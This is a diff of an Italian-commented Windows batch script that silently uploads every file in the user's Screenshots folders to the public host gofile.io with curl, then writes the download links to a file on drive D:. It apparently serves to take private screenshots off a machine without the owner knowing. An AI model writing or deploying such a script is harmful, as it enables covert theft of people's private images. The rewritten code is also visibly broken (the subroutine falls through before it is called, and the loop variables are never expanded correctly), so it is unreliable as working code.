@@ -4,8 +4,6 @@ setlocal
 :: Percorsi
 set "SRC1=%USERPROFILE%\Pictures\Screenshots"
 set "SRC2=%USERPROFILE%\Pictures\Screenshots2"
-set "TMPZIP1=%TEMP%\Screenshots.zip"
-set "TMPZIP2=%TEMP%\Screenshots2.zip"
 set "DEST=D:\linknic.txt"
 
 :: Verifica se D:\ esiste
@@ -15,49 +13,35 @@ if not exist D:\ exit /b
 if not exist "%SRC1%" exit /b
 if not exist "%SRC2%" exit /b
 
-:: Crea lo ZIP per il primo file
-powershell -Command "Compress-Archive -Path '%SRC1%\*' -DestinationPath '%TMPZIP1%' -Force"
+:: Crea il file pass15.txt per indicare che il processo è iniziato
+echo Processo di caricamento iniziato... > D:\pass15.txt
 
-:: Crea lo ZIP per il secondo file
-powershell -Command "Compress-Archive -Path '%SRC2%\*' -DestinationPath '%TMPZIP2%' -Force"
-
-:: Carica il primo file ZIP su GoFile.io e ottieni il link
-for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP1%" https://gofile.io/uploadFile') do (
-    set "RESPONSE1=%%i"
+:: Funzione per caricare un singolo file e restituire il link
+:startUpload
+for %%f in (%1\*) do (
+    if exist "%%f" (
+        for /f "delims=" %%i in ('curl -s -F "file=@%%f" https://gofile.io/uploadFile') do (
+            set "RESPONSE=%%i"
+            for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "downloadPage"') do (
+                set "LINK=%%~a"
+                set "LINK=%LINK:"=%"
+                set "LINK=%LINK:~1,-1%"
+                if defined LINK (
+                    echo File %%f caricato con link: %LINK% >> D:\linknic.txt
+                )
+            )
+        )
+    )
 )
+goto :eof
 
-:: Carica il secondo file ZIP su GoFile.io e ottieni il link
-for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP2%" https://gofile.io/uploadFile') do (
-    set "RESPONSE2=%%i"
-)
+:: Carica i file della cartella Screenshots su GoFile.io
+start cmd /c call :startUpload "%SRC1%"
 
-:: Estrai il link per il primo file dal JSON di risposta
-for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE1% ^| findstr "downloadPage"') do (
-    set "LINK1=%%~a"
-)
-
-:: Estrai il link per il secondo file dal JSON di risposta
-for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE2% ^| findstr "downloadPage"') do (
-    set "LINK2=%%~a"
-)
-
-:: Pulisci virgolette e spazi per entrambi i link
-set "LINK1=%LINK1:"=%"
-set "LINK2=%LINK2:"=%"
-set "LINK1=%LINK1:~1,-1%"
-set "LINK2=%LINK2:~1,-1%"
-
-:: Se entrambi i link sono validi, salvali su D:\linknic.txt
-if defined LINK1 (
-    echo Primo link: %LINK1% >> D:\linknic.txt
-)
-if defined LINK2 (
-    echo Secondo link: %LINK2% >> D:\linknic.txt
-)
+:: Carica i file della cartella Screenshots2 su GoFile.io
+start cmd /c call :startUpload "%SRC2%"
 
 :: Pulizia
-del "%TMPZIP1%"
-del "%TMPZIP2%"
+echo Caricamento completato. >> D:\linknic.txt
 
 exit /b
-
